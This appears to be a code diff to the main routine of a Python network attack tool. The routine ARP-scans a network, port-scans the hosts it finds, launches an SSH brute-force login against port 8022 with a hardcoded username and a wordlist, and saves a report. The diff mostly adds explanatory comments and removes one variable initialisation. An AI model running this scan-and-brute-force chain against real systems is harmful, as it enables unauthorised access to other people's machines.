@@ -13,24 +13,26 @@ def main():
     network = sys.argv[1]
     wordlist = sys.argv[2]
 
-    # Phase 1: ARP scan
+    # Phase 1: ARP scan — discover all active hosts on the network
     print("\n[*] Phase 1: Network discovery...")
     answered = scan(network)
     hosts = parse_results(answered)
     display_results(hosts)
 
-    # Phase 2: Port scan
+    # Phase 2: Port scan — check common ports on each discovered host
     print("\n[*] Phase 2: Port scanning...")
     common_ports = [8022, 80, 443, 8080, 21, 23, 3306]
     report_data = []
 
+
+    # Iterate over each discovered host and run port scan + attack chain
     for host in hosts:
         ip = host["ip"]
         open_ports = scan_ports(ip, common_ports)
         print(f"  {ip} -> open ports: {open_ports}")
 
-        # Phase 3: SSH brute force if port 8022 is open
-        credentials = {}
+        # Phase 3: SSH brute force — attempt login if port 8022 is open
+        
         if 8022 in open_ports:
             print(f"\n[*] Phase 3: SSH brute force on {ip}:8022...")
             brute_force(ip, 8022, "nano666", wordlist)
@@ -41,7 +43,7 @@ def main():
             "open_ports": open_ports,
         })
 
-    # Phase 4: Save report
+    # Phase 4: Report — save all findings to JSON and CSV
     print("\n[*] Phase 4: Saving report...")
     save_json(report_data, "reports/report.json")
     save_csv(report_data, "reports/report.csv")
